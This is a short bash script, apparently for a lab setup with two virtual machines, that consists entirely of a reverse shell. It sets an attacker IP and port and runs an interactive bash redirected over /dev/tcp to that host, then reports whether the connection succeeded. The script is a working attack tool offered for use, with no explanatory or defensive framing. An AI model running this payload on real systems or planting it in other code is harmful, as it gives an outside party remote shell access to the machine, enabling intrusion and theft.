#!/bin/bash

# Attacker's IP and port (listener)
ATTACKER_IP="172.29.120.184"   # Change this to your VM1 IP
ATTACKER_PORT="868"       # Choose a port you want to use for the listener

if bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1"; then
	echo "Reverse shell connected successfully"
else 
	echo "Reverse shell connected failed"
	
fi
